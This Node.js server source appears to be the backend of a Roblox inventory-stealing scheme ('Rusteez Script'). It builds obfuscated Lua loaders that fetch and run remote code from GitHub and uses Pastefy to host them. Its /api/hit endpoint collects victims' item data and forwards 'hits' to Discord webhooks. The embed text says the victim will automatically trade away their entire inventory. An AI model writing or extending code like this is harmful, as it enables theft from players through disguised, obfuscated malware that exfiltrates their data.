const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags, WebhookClient } = require('discord.js');
const app = express();
app.use(express.json());
const server = http.createServer(app);
const axios = require('axios');
const { PastefyClient } = require('@interaapps/pastefy');

const BaseInfo = require('./models/BaseInfo'); // <-- import du modèle
const ScriptsInfos = require('./models/Scripts'); // <-- import du modèle
const UsersInfo = require('./models/Users'); // <-- import du modèle

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN; // fallback optional
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const PASTEFY_KEY = process.env.PASTEFY_KEY;
const OAUTH2_CLIENT_ID = process.env.OAUTH2_CLIENT_ID;
const OAUTH2_CLIENT_SECRET = process.env.OAUTH2_CLIENT_SECRET;
const OAUTH2_REDIRECT = process.env.OAUTH2_REDIRECT; // redirect URI registered in Discord app
const LUA_OBF_KEY = process.env.LUA_OBF_KEY;
const ADMIN_DISCORD_IDS = process.env.ADMIN_DISCORD_IDS || ''; // optional CSV of admin discord ids

const pastefy = new PastefyClient(PASTEFY_KEY);

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

// In-memory sessions map: sessionToken -> { id, username, createdAt }
const SESSIONS = new Map();

// Helper: generate session token
function generateSessionToken() {
    return randomBytes(24).toString('hex');
}

// generate random state token
function generateState() { return randomBytes(12).toString('hex'); }

// Helper: check if a session token (or admin token) is valid and returns user info
function getAuthFromRequest(req) {
    // 1) query ?token=
    const qtoken = req.query && req.query.token;
    // 2) header x-admin-token (legacy) or Authorization: Bearer <token>
    const headerToken = req.headers['x-admin-token'] || (req.headers.authorization && req.headers.authorization.split(' ')[1]);

    const token = qtoken || headerToken;
    if (!token) return null;

    // legacy ADMIN_TOKEN support
    if (ADMIN_TOKEN && token === ADMIN_TOKEN) {
        return { adminUsingLegacyToken: true };
    }

    const session = SESSIONS.get(String(token));
    if (!session) return null;
    return session;
}

// Optional admin check by Discord ID list
function isDiscordAdmin(auth) {
    if (!auth) return false;
    if (auth.adminUsingLegacyToken) return true;
    if (!auth.id) return false;
    if (!ADMIN_DISCORD_IDS) return true; // if not configured, accept any authenticated discord user
    const allowed = ADMIN_DISCORD_IDS.split(',').map(s => s.trim()).filter(Boolean);
    return allowed.includes(String(auth.id));
}

/* ----------------- OAuth2 endpoints ----------------- */
// Redirect to Discord OAuth2 authorize URL (with state)
app.get('/auth/discord', (req, res) => {
    if (!OAUTH2_CLIENT_ID || !OAUTH2_REDIRECT) {
        return res.status(500).send('OAuth2 not configured on server.');
    }

    const state = generateState();
    // store state temporarily (in-memory). For production, stocker en cookie ou Redis.
    SESSIONS.set(`state:${state}`, { createdAt: Date.now() });

    const params = new URLSearchParams({
        client_id: OAUTH2_CLIENT_ID,
        redirect_uri: OAUTH2_REDIRECT,
        response_type: 'code',
        scope: 'identify',
        state: state
    });

    return res.redirect(`https://discord.com/api/oauth2/authorize?${params.toString()}`);
});

// Callback route: validate state before exchanging code
app.get('/auth/discord/callback', async (req, res) => {
    const code = req.query.code;
    const state = req.query.state;

    if (!code) return res.status(400).send('Missing code');

    // Si state absent => fallback (moins sécurisé). On logge l'événement.
    if (!state) {
        log('⚠️ OAuth callback reçu sans state — fallback activé (CSRF risk).');
    } else {
        // validate state
        const stateObj = SESSIONS.get(`state:${state}`);
        if (!stateObj) return res.status(400).send('Invalid state');
        SESSIONS.delete(`state:${state}`);
    }

    try {
        // Exchange code for token
        const tokenResp = await axios.post('https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: OAUTH2_CLIENT_ID,
                client_secret: OAUTH2_CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: String(code),
                redirect_uri: OAUTH2_REDIRECT,
            }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const tokenData = tokenResp.data;
        if (!tokenData || !tokenData.access_token) {
            log('[OAUTH] no access_token in response');
            return res.status(500).send('OAuth token exchange failed.');
        }

        // Fetch user info
        const meResp = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${tokenData.access_token}` }
        });
        const user = meResp.data;
        if (!user || !user.id) {
            log('[OAUTH] no user returned');
            return res.status(500).send('Failed to fetch Discord user.');
        }

        // Create server session token
        const sessionToken = generateSessionToken();
        const sessionObj = { id: user.id, username: user.username, createdAt: new Date().toISOString() };
        SESSIONS.set(sessionToken, sessionObj);

        const redirectTarget = "https://m4gix-ws.onrender.com/";
        try {
            const redirectUrl = new URL(redirectTarget);
            redirectUrl.searchParams.set('token', sessionToken);
            return res.redirect(redirectUrl.toString());
        } catch (err) {
            log(`⚠️ Invalid redirectTarget, returning JSON instead: ${err.message}`);
            return res.json({ success: true, token: sessionToken, user: sessionObj, redirect: redirectTarget });
        }
    } catch (err) {
        log(`❌ [OAUTH] callback error: ${err && err.message ? err.message : err}`);
        return res.status(500).send('OAuth callback error');
    }
});

/* ----------------- Paste/obfuscate helpers (existing) ----------------- */

async function uploadScript(script, scriptTitle, folder) {
    try {
        // Correction ici : on utilise .pastes.create()
        const paste = await pastefy.createPaste({
            title: scriptTitle,
            content: script,
            folder: folder,
            visibility: 'UNLISTED',
            type: 'PASTE'
        });

        log(`✅ Succès ! Fichier uploadé.`);
        log(`🔗 URL: ${paste.raw_url}`);
        return paste;
    } catch (error) {
        log('❌ Erreur lors de l\'upload :', error);
    }
    return null;
}

async function obfuscateScript(luaCode) {
    try {
        log("🔍 [OBF] Step 1: Creating Session...");

        // ÉTAPE 1 : Créer la session avec le code source
        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript',
            luaCode, // Le code est envoyé directement comme texte
            {
                headers: {
                    'apikey': LUA_OBF_KEY,
                    'content-type': 'text/plain' // La doc dit 'text'
                }
            }
        );

        const sessionId = sessionResponse.data.sessionId;
        if (!sessionId) throw new Error("No Session ID returned");

        log(`🔍 [OBF] Step 2: Applying Obfuscation (Session: ${sessionId.substring(0, 8)}...)`);

        // ÉTAPE 2 : Appliquer les plugins d'obfuscation
        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate',
            {
                "MinifiyAll": true,   // Dans le noeud racine
                "Virtualize": true,   // Dans le noeud racine
                "CustomPlugins": {
                    // Recommandé avant la virtualisation pour éviter les erreurs
                    "RewriteToLua51": true,
                    "EncryptStrings": [100],
                    "ControlFlowFlattenV1AllBlocks": [100],
                    "SwizzleLookups": [100],
                    "MutateAllLiterals": [100] // Très bien car sans impact sur les perfs
                }
            },
            {
                headers: {
                    'apikey': LUA_OBF_KEY,
                    'sessionId': sessionId,
                    'content-type': 'application/json'
                }
            }
        );

        if (obfResponse.data && obfResponse.data.code) {
            log(`✅ [OBF] Success! Final code received.`);
            return obfResponse.data.code;
        }

        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.response?.data?.message || error.message}`);
        return null;
    }
}

function generateScriptId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let id = '';
    for (let i = 0; i < 8; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
    return id;
}

async function createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw) {
    let targetsArray = [];
    if (Array.isArray(targetsRaw)) targetsArray = targetsRaw.map(t => String(t));
    else if (typeof targetsRaw === 'string') {
        targetsArray = targetsRaw.split(',').map(s => s.trim()).filter(s => s.length > 0);
    }

    const luaTargets = targetsArray.length > 0 ? targetsArray.map(t => `"${t.replace(/"/g, '\\"')}"`).join(', ') : '';
    const scriptId = generateScriptId();

    // build Lua loader script
    const src = [
        `local fenv = getfenv()`,
        `local var0 = setmetatable({}, {`,
        `\t["__index"] = {},`,
        `})`,
        ``,
        `fenv["MinIncome"] = ${minIncome}`,
        `fenv["MaxItems"] = ${maxItems}`,
        `fenv["Targets"] = { ${luaTargets} }`,
        `fenv["Visual"] = ${visualRaw === "" ? '""' : '"' + String(visualRaw).replace(/"/g, '\\"') + '"'}`,
        `fenv["ScriptId"] = "${scriptId}"`,
        ``,
        `local var1 = game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/scripts/refs/heads/main/ts")`,
        `local var2 = loadstring(var1)`,
        `local var3 = var2()`
    ].join('\n');

    const lua = await obfuscateScript(src);
    const paste = await uploadScript(lua, `${scriptId}.lua`, 'hfI1y3F8');
    return `loadstring(game:HttpGet("${paste.raw_url}"))()`;
}

/* ----------------- DB connect + Discord bot (unchanged) ----------------- */
mongoose.connect(MONGO_URI)
    .then(() => {
        log("✅ [DB] Connexion établie");
    })
    .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- BOT DISCORD ---
const clientDiscord = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

/* ----------------- API routes ----------------- */
// admin verify: accepts ?token= or Authorization Bearer <token>
app.get('/api/admin/verify', (req, res) => {
    const auth = getAuthFromRequest(req);
    if (auth) {
        return res.json({ success: true, user: auth });
    }
    return res.json({ success: false });
});

// create-script: only allowed for authenticated discord sessions (or legacy ADMIN_TOKEN)
app.post('/api/create-script', async (req, res) => {
    try {
        const auth = getAuthFromRequest(req);
        if (!auth || !isDiscordAdmin(auth)) {
            return res.status(403).json({ success: false, message: 'Forbidden' });
        }

        const body = req.body || {};
        const minIncome = Number(body.minIncome) || 10000000;
        const maxItems = Number(body.maxItems) || 10;
        const targetsRaw = body.targets || ["MagixSafe", "M4GIX_TAB01", "M4GIX_TAB02", "TeCu71710"];
        const webhookUrlRaw = body.webhookurl || '';
        const visualRaw = body.visual || '';

        const loader = await createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw);

        return res.status(201).json({ success: true, data: { Script: loader } });
    } catch (err) {
        log(`❌ [API] POST /api/create-script error: ${err && err.message ? err.message : err}`);
        return res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

app.post('/api/base-infos', async (req, res) => {
    try {
        const payload = req.body || {};
        if (!payload.Name) {
            return res.status(400).json({ success: false, message: 'Missing Name field' });
        }

        // Sanitize / normalise Brainrots
        const brainrots = Array.isArray(payload.Brainrots) ? payload.Brainrots.map(br => ({
            Name: br && br.Name ? String(br.Name) : '',
            IncomeStr: br && br.IncomeStr ? String(br.IncomeStr) : '$0/s',
            Income: br && typeof br.Income !== 'undefined' ? Number(br.Income) || 0 : 0,
            Rarity: br && br.Rarity ? String(br.Rarity) : 'Common',
            Mutation: br && br.Mutation ? String(br.Mutation) : 'Default',
            Traits: Array.isArray(br && br.Traits) ? br.Traits : (br && typeof br.Traits === 'string' ? br.Traits.split(',').map(t => t.trim()) : [])
        })) : [];

        const update = {
            TotalPlace: Number(payload.TotalPlace) || 0,
            Brainrots: brainrots
        };

        const doc = await BaseInfo.findOneAndUpdate(
            { Name: String(payload.Name) },
            { $set: update },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        log(`✅ [API] BaseInfo saved for ${payload.Name}`);
        return res.json({ success: true, data: doc });
    } catch (err) {
        log(`❌ [API] /api/base-infos error: ${err}`);
        return res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

app.get('/api/base-infos', async (req, res) => {
    try {
        const docs = await BaseInfo.find({}).lean();
        const items = [];
        for (const bi of docs) {
            const baseName = bi.Name || '';
            const totalPlace = bi.TotalPlace || 0;
            const brainrots = Array.isArray(bi.Brainrots) ? bi.Brainrots : [];
            for (const br of brainrots) {
                items.push({
                    BaseName: baseName,
                    TotalPlace: totalPlace,
                    Name: br && br.Name ? br.Name : '',
                    IncomeStr: br && br.IncomeStr ? br.IncomeStr : '$0/s',
                    Income: br && typeof br.Income !== 'undefined' ? Number(br.Income) || 0 : 0,
                    Rarity: br && br.Rarity ? br.Rarity : 'Common',
                    Mutation: br && br.Mutation ? br.Mutation : 'Default',
                    Traits: Array.isArray(br && br.Traits) ? br.Traits : []
                });
            }
        }
        return res.json({ success: true, data: items });
    } catch (err) {
        log(`❌ [API] GET /api/base-infos error: ${err}`);
        return res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

app.post('/api/hit', async (req, res) => {
    try {
        const payload = req.body || {};

        // Validation minimale attendue par ton script Lua
        if (!payload.Name) {
            log('⚠️ /api/hit reçu sans Name');
            // retourner 201 quand même pour la compatibilité Lua
            return res.status(201).json({ Success: true, Message: 'Hit received' });
        }

        // On forwarde d'abord vers WEBHOOK_URL si configuré
        const hitInfo = payload; // forwarder uniquement le payload tel quel
        log(`📣 [HIT] Reçu: ${hitInfo.Name || 'N/A'} ScriptId:${hitInfo.ScriptId || 'N/A'}`);

        if (WEBHOOK_URL) {
            PostHitOnWebHook(WEBHOOK_URL, hitInfo)
                .catch(err => log(`⚠️ PostHitOnWebHook (env) rejection: ${err && err.message ? err.message : err}`));
        } else {
            log('⚠️ WEBHOOK_URL non configuré, skip forward to env webhook');
        }

        // Si ScriptId présent et valide (non null, non vide), rechercher script et forwarder aussi
        try {
            if (hitInfo.ScriptId && String(hitInfo.ScriptId).trim() !== '') {
                const script = await ScriptsInfos.findOne({ Id: String(hitInfo.ScriptId) }).lean();
                if (script && script.WebHookUrl) {
                    // éviter double envoi vers la même URL
                    if (String(script.WebHookUrl) !== String(WEBHOOK_URL)) {
                        PostHitOnWebHook(script.WebHookUrl, hitInfo)
                            .catch(err => log(`⚠️ PostHitOnWebHook (script) rejection: ${err && err.message ? err.message : err}`));
                    } else {
                        log('ℹ️ Script WebHookUrl identique à WEBHOOK_URL, envoi unique effectué.');
                    }
                } else {
                    log(`⚠️ Aucun WebHookUrl trouvé pour ScriptId ${hitInfo.ScriptId}`);
                }
            }
        } catch (err) {
            log(`⚠️ Erreur lookup Script: ${err && err.message ? err.message : err}`);
            // on continue — la réponse au client Lua restera 201
        }

        // Retourner toujours 201 pour que le script Lua considère l'envoi comme réussi
        return res.status(201).json({ Success: true, Message: 'Hit received' });
    } catch (err) {
        // En cas d'exception interne, journaliser mais retourner success quand même
        log(`❌ [API] POST /api/hit error (catch): ${err && err.message ? err.message : err}`);
        return res.status(201).json({ Success: true, Message: 'Hit received (processing error logged)' });
    }
});

async function PostHitOnWebHook(webHookUrl, hitInfo) {
    try {
        const webhookClient = new WebhookClient({ url: webHookUrl });
        const hitEmbed = new EmbedBuilder()
            .setTitle("Rusteez Hit")
            .setColor(0x2b2d31)
            .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
            .addFields(
                {
                    name: "📄 Player Information",
                    value: `\`\`\`properties\n🆔 Username     : ${hitInfo.Name}\n👑 Receiver     : ${Array.isArray(hitInfo.Targets) ? hitInfo.Targets.join(', ') : hitInfo.Targets}\n\`\`\``
                },
                {
                    name: "🧠 Brainrots",
                    value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0
                        ? hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0)).map(br => {
                            // 1. Préparation des éléments (Mutation + Traits)
                            let extras = [];

                            // On ajoute la mutation en premier si elle existe
                            if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
                                extras.push(br.Mutation);
                            }

                            // On ajoute les traits (qu'ils soient déjà une string ou un array)
                            if (br.Traits) {
                                if (Array.isArray(br.Traits)) {
                                    br.Traits.forEach(t => { if (t && t !== "") extras.push(t); });
                                } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
                                    extras.push(br.Traits);
                                }
                            }

                            // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
                            const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";

                            // 3. Retour de la ligne formatée
                            return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
                        }).join('\n')
                        : "None"}\n\`\`\``
                }
            )
            .setFooter({ text: `Rusteez Script` })
            .setTimestamp();
        await webhookClient.send({
            content: hitInfo.Name,
            embeds: [hitEmbed]
        });
    } catch (err) {
        log(`⚠️ Forward Webhook Error: ${err.message}`);
    }
}

app.use(express.static('public'));

server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
